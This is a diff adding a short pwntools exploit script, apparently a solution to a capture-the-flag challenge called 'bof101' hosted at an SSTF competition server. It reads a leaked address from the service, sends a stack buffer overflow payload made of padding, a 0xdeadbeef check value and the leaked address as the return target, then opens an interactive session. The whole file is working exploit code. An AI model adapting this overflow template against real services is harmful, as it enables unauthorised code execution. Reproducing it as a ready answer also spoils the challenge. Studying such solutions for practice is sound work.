@@ -1,0 +1,17 @@
+from pwn import *
+
+r = remote("bof101.sstf.site", 1337)
+
+r.recvuntil("addr: ")
+
+addr = int(r.recvline()[2:-1], 16)
+
+payload  = b""
+payload += 0x8c * b"a"
+payload += p32(0xdeadbeef)
+payload += 0x8 * b"b"
+payload += p64(addr)
+
+r.sendlineafter(": ", payload)
+
+r.interactive()
